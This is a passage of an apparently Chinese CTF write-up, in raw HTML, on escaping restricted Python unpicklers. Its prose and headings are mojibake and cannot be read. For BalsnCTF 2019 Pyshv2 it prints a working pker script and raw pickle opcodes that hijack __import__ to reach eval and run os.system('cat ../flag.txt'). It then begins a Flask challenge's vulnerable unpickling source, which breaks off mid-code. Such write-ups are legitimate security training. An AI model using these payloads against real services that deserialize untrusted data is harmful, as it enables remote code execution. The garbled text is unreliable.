&lt;h3 id="--ä»…å¯ä»¥å¼•å…¥é¢˜ç›®ä¸­è‡ªè®¾ç©ºæ¨¡å—">&amp;ndash;&amp;raquo;ä»…å¯ä»¥å¼•å…¥é¢˜ç›®ä¸­è‡ªè®¾ç©ºæ¨¡å—&lt;/h3>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
æ —å­6 - [BalsnCTF 2019] Pyshv2
&lt;/h4>
&lt;/summary>
&lt;p>é¢˜ç›®çŽ¯å¢ƒ-&amp;gt;https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2&lt;/p>
&lt;p>&lt;code>find_class()&lt;/code>ç¨æœ‰åŒºåˆ«ï¼Œåœ¨&lt;code>getattr()&lt;/code>ä¹‹å‰å…ˆç”¨äº†&lt;code>__import__()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811220348086.png" alt="image-20210811220348086">&lt;/p>
&lt;p>è¿™æ¬¡çš„ç™½åå•æ˜¯&lt;code>structs&lt;/code>ï¼Œç„¶é¹…è¿™æ˜¯ä¸ªç©ºçš„æ¨¡å— è™šæ™ƒä¸€æžªã€‚ä¸è¿‡æ˜¯ç©ºçš„ä¸è¦ç´§ï¼Œç…§æ ·æœ‰å†…ç½®æ–¹æ³•ã€‚&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811220801646.png" alt="image-20210811220801646">&lt;/p>
&lt;p>&lt;code>__builtins__&lt;/code>æ˜¯æ‰€æœ‰æ¨¡å—å…¬æœ‰çš„å­—å…¸ï¼Œè®°å½•æ‰€æœ‰çš„å†…å»ºå‡½æ•°ï¼Œå¯ä»¥é€šè¿‡å¯¹&lt;code>__builtins__&lt;/code>å†…ç›¸åº”çš„é”®æ¥ä¿®æ”¹å¯¹åº”çš„å‡½æ•°ï¼Œä¸Šå›¾ä¸­æˆ‘ä»¬æ‰¾åˆ°äº†evalæ–¹æ³•ï¼Œä½†å–å‡ºevalè¿™ä¸ªé”®å¦å¤–éœ€è¦ä¸€ä¸ªgetæ–¹æ³•æ‰èƒ½åšåˆ°ã€‚&lt;/p>
&lt;p>æˆ‘ä»¬çŸ¥é“ï¼Œ&lt;code>__getattribute__&lt;/code>é­”æœ¯æ–¹æ³•å¯ä»¥è®¿é—®ä»»æ„å±žæ€§ã€‚è€ŒåŒæ—¶&lt;code>__import__&lt;/code>å¹¶ä¸æ˜¯é“æ¿ä¸€å—ï¼Œå®ƒçš„å…¨éƒ¨å‚æ•°æ˜¯&lt;code>__import__(name, globals=None, locals=None, fromlist=(), level=0)&lt;/code>ï¼Œå®ƒå¯ä»¥è¢«æ›¿æ¢ï¼ˆé€šè¿‡å¯¼å…¥builtinsæ¨¡å—å¹¶èµ‹å€¼ç»™&lt;code>builtins.__import__&lt;/code>ï¼‰æ¥å¯ä»¥ä¿®æ”¹importè¯­å¥çš„è¯­ä¹‰å¹¶ä¸”ä¸ä¼šå¯¼è‡´ä»£ç é—®é¢˜ï¼Œè€Œé¢˜ç›®ä¸­é‡å†™çš„find_class()ç‰¹åœ°åœ¨getattr()ä¹‹å‰è°ƒç”¨äº†&lt;code>__import__&lt;/code>ï¼ŒçŽ°åœ¨æˆ‘ä»¬å¯ä»¥åŠ«æŒè¿™ä¸ª__import__ï¼Œè®©å®ƒå˜ä¸º&lt;code>__getattribute__&lt;/code>ï¼Œè®©æˆ‘ä»¬å¼•å…¥çš„structså˜ä¸º&lt;code>structs.__getattribute__(structs).xxx&lt;/code>ã€‚&lt;/p>
&lt;p>å¯¹äºŽå¼•å…¥æ¨¡å—çš„æ£€æŸ¥åªä¼šå‡ºçŽ°åœ¨b&amp;rsquo;c&amp;rsquo;æ—¶ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ç”¨&lt;code>S&lt;/code>æ“ä½œç åŠ«æŒ&lt;code>__import__&lt;/code>æ—¶å¹¶ä¸ä¼šå¼•å‘find_class()çš„è¿‡æ»¤ã€‚&lt;/p>
&lt;p>ç„¶è€Œæˆ‘ä»¬ä¸èƒ½ç›´æŽ¥getattr()=getattr()è¿™æ ·è¦†ç›–&lt;code>__import__&lt;/code>ï¼Œæˆ‘ä»¬è¿˜éœ€è¦&lt;code>__dict__&lt;/code>çš„å¸®å¿™ã€‚&lt;code>__dict__&lt;/code>æ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œå­˜å‚¨å¹¶å†³å®šäº†ä¸€ä¸ªå¯¹è±¡çš„æ‰€æœ‰å±žæ€§ï¼Œå¦‚æžœå®ƒçš„å†…å®¹è¢«æ”¹å˜ï¼Œå±žæ€§ä¹Ÿä¼šè·Ÿç€æ”¹å˜ã€‚&lt;/p>
&lt;p>æ‰€ä»¥æ•´åˆä¸€ä¸‹ä¸Šé¢çš„æ€è·¯ï¼šæˆ‘ä»¬å…ˆè¦å¼•å…¥åŠ©æ‰‹list&lt;code>structs.__dict__&lt;/code>ï¼Œå–å‡ºstructsç©ºæ¨¡å—çš„å†…å»ºå‡½æ•°ï¼ˆä¸€ä¸ªå¾…å–çš„dictï¼‰&lt;code>structs.__builtins__&lt;/code>å’Œæˆ‘ä»¬éœ€è¦çš„é­”æœ¯æ–¹æ³•&lt;code>structs.__getattribute__&lt;/code>ã€‚ä¹‹åŽä»Žå†…å»ºå‡½æ•°&lt;code>structs.__builtins__&lt;/code>ä¸­å°†é”®åä¸º&lt;code>__import__&lt;/code>çš„å€¼æ›¿æ¢ä¸º&lt;code>structs.__getattribute__&lt;/code>ï¼Œç„¶åŽå€ŸåŠ©&lt;code>__dict__&lt;/code>å°†structsçš„structså±žæ€§è¦†ç›–ä¸ºä¿®æ”¹åŽçš„å†…å»ºå‡½æ•°ã€‚è¿™æ—¶ï¼Œæˆ‘ä»¬å†æ¬¡ç”¨b&amp;rsquo;c&amp;rsquo;ä»Žstructsä¸­å¼•å…¥getæ—¶è§¦å‘find_class()ä¸­çš„&lt;code>__import__&lt;/code>ï¼Œä¹Ÿå°±ç›¸å½“äºŽåœ¨æ‰§è¡Œ&lt;code>structs.__getattribute__('structs').get&lt;/code>ï¼Œè¿™æ ·æˆ‘ä»¬å°±æ‹¿åˆ°äº†getæ–¹æ³•ã€‚è€Œä¹‹å‰æˆ‘ä»¬åˆå·²ç»æ›¿æ¢äº†structså±žæ€§ä¸ºå†…å»ºå‡½æ•°&lt;code>__builtins__&lt;/code>ï¼Œæ‰€ä»¥åˆ©ç”¨è¿™ä¸ªå¾—åˆ°çš„getæ–¹æ³•å°±å¯ä»¥ä»Ž&lt;code>__builtins__&lt;/code>ä¸­å–å‡ºevalï¼Œæ‰§è¡Œä»£ç äº†ã€‚ä¹‹åŽæ‰§è¡Œä»£ç çš„éƒ¨åˆ†åŒä¸Šé¢çš„sys.modulesçš„æ€è·¯ã€‚&lt;/p>
&lt;p>pker&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">__dict__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__dict__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">__builtins__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">gtat&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__getattribute__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">__builtins__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">gtat&lt;/span>
&lt;span style="color:#111">__dict__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">__builtins__&lt;/span>
&lt;span style="color:#111">builtin_get&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">eval&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">builtin_get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;pickle.sys.modules[&amp;#39;&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#d88200">&amp;#39;].system(&amp;#39;&lt;/span>&lt;span style="color:#111">cat&lt;/span> &lt;span style="color:#f92672">../&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">txt&lt;/span>&lt;span style="color:#d88200">&amp;#39;)&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>opcode&lt;/p>
&lt;pre tabindex="0">&lt;code>b&amp;quot;cstructs\n__dict__\np0\n0cstructs\n__builtins__\np1\n0cstructs\n__getattribute__\np2\n0g1\nS'__import__'\ng2\nsg0\nS'structs'\ng1\nscstructs\nget\np5\n0g5\n(S'eval'\ntRp6\n0g6\n(S'pickle.sys.modules['os'].system('cat ../flag.txt')'\ntR.&amp;quot;
&lt;/code>&lt;/pre>&lt;/details>
&lt;h3 id="ç¦æ­¢bræ“ä½œç ">ç¦æ­¢&lt;code>b'R'&lt;/code>æ“ä½œç &lt;/h3>
&lt;p>ä¹Ÿå°±ç›¸å½“äºŽä¸å¯ä»¥ç”¨&lt;code>__reduce__&lt;/code>ï¼Œæœ‰ä»¥ä¸‹å‡ ç§åº”å¯¹æ–¹æ³•ï¼ˆä»¥ä¸‹æ–¹æ³•åŒæ ·å¯ä»¥å•ç‹¬ä½¿ç”¨é¸­ï¼ï¼ï¼ï¼‰ï¼Œå˜é‡è¦†ç›–ï¼ˆæ— ç›´æŽ¥ä»£ç æ‰§è¡Œï¼‰æˆ–åˆ©ç”¨&lt;code>b'i'&lt;/code>ï¼Œ&lt;code>b'i'&lt;/code>ï¼Œ&lt;code>b'b'&lt;/code>è¿™äº›æ“ä½œç æ¥rceã€‚&lt;/p>
&lt;h3 id="--å˜é‡è¦†ç›–">&amp;ndash;&amp;raquo;å˜é‡è¦†ç›–&lt;/h3>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
æ —å­7 - [é«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ›2020] webtmp
&lt;/h4>
&lt;/summary>
&lt;p>ï¼ˆè¿™ä¸ªé¢˜æ˜¯ç¼åˆçš„[SJTU 2019]Pickle ä»¥åŠ [SJTU 2019]Pickle-Revengeçš„é¢˜ = =ã€‚é™åˆ¶äº†&lt;code>R&lt;/code>æ“ä½œç ï¼ŒåŒæ—¶é‡å†™&lt;code>find_class()&lt;/code>é™åˆ¶å¼•å…¥æ¨¡å—ä¸º&lt;code>__main__&lt;/code>ï¼Œä¸¤ä¸ªè€ƒç‚¹ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">io&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">Response&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">secret&lt;/span>
&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Animal&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">category&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">category&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__repr__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;Animal(name=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#d88200">!r}&lt;/span>&lt;span style="color:#d88200">, category=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>&lt;span style="color:#d88200">!r}&lt;/span>&lt;span style="color:#d88200">)&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__eq__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">other&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#111">Animal&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">RestrictedUnpickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Unpickler&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">find_class&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">modules&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">UnpicklingError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;global &amp;#39;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">.&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39; is forbidden&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">restricted_loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">RestrictedUnpickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">BytesIO&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">load&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;GET&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;source&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">Response&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__file__&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">mimetype&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;text/plain&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">pickle_data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;R&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;No... I don&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">t like R-things. No Rabits, Rats, Roosters or RCEs.&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">restricted_loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">Animal&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;Are you sure that is an animal???&amp;#39;&lt;/span>
&lt;span style="color:#111">correct&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">Animal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;unpickle_result.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">giveflag&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">correct&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">repr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Something wrong&amp;#34;&lt;/span>
&lt;span style="color:#111">sample_obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Animal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ä¸€ç»™æˆ‘å“©giaogiao&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Giao&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">pickle_data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sample_obj&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;unpickle_page.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">sample_obj&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">sample_obj&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
